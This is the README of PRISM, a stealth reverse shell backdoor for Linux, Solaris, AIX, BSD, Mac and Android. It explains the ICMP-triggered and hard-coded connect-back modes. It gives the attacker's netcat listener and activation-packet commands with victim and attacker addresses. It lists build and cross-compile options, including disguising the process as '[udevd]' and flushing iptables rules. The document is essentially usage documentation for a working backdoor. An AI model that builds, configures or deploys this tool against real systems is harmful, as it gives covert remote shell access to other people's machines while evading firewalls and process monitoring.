# Prism

PRISM is an user space stealth reverse shell backdoor. 

It was fully tested on:

* **Linux**
* **Solaris**
* **AIX**
* **BSD/Mac**
* **Android**

PRISM can works in two different ways: **ICMP** and **STATIC** mode.

## ICMP mode

Using this operation mode the backdoor waits silently in background for a specific ICMP packet 
containing the host/port to connect back and a private key to prevent third party access. 

* First, run **netcat** on the attacker machine to wait for incoming connection from the backdoor:
```bash
$ nc -l -p 6666 
```

* Using the **sendPacket.py** script (or another packet builder) send the activation packet to the backdoor: 
```bash
./sendPacket.py 192.168.0.1 p4ssw0rd 192.168.0.10 6666
```
 **192.168.0.1**  is the victim machine running prism backdoor  
 **p4ssw0rd** is the key  
 **192.168.0.10** is the attacker machine address  
 **6666** is the attacker machine port

* The backdoor will connect back to netcat!


## STATIC mode

Using this operation mode the backdoor try to connects to an hard-coded IP/PORT.  
In this case, run netcat listening on the hard-coded machine/port:
```bash
 $ nc -l -p [PORT] 
```

## Features

* Two operating modes (ICMP and STATIC)
* Runtime process renaming
* No listening ports
* Automatic iptables rules flushing
* Written in pure C
* No library dependencies

## Configuration

Before building, you have to configure the backdoor editing the source code.  
Following the configuration parameters description:

**STATIC mode:**  
*REVERSE_HOST*:   Machine address to connect back  
*REVERSE_PORT*:   Machine port to connect back  
*RESPAWN_DELAY*:  Time, in seconds, between each connection  

**ICMP mode:**  
*ICMP_KEY*:       Key/Password to activate the backdoor  

**Generic parameters:**  
*MOTD*:           Message to be printed at the backdoor connection  
*SHELL*:          Shell to execute  
*PROCESS_NAME*:   Fake process name  

## Building

`gcc <..OPTIONS..> -Wall -s -o prism prism.c`

Available GCC options:  
**-DDETACH**        #Run the process in background  
**-DSTATIC**        #Enable STATIC mode (default is the ICMP mode)  
**-DNORENAME**      #Doesn't renames the process  
**-DIPTABLES**     #Try to flush all iptables rules  

Example:  
`gcc -DDETACH -DNORENAME -Wall -s -o prism prism.c`

## Cross Compiling
* **Android**  
Change the shell to */system/bin/sh*  
`apt-get install gcc-arm-linux-gnueabi`  
`arm-linux-gnueabi-gcc -DSTATIC -DDETACH -DNORENAME -static -march=armv5 prism.c -o prism`

* **Linux 64bit** (using a 32bit host system)   
`apt-get install libc6-dev-amd64`  
`gcc -DDETACH -m64 -Wall -s -o prism prism.c`

* **Linux 32bit** (using a 64bit host system)   
`apt-get install libc6-dev-i386`  
`gcc -DDETACH -m32 -Wall -s -o prism prism.c`

## Backdoor building information

The backdoor ignore any command line parameter, except the **Inf0** (the last char is a digit).  
This option allow you to see some information about the backdoor:

```bash
$ ./prism Inf0
 Version:  	0.5
 Mode:			icmp
 Key:			p455w0rD
 Process name:		[udevd]
 Shell:			/bin/sh
 Detach:		Yes
 Flush Iptables:	No
```
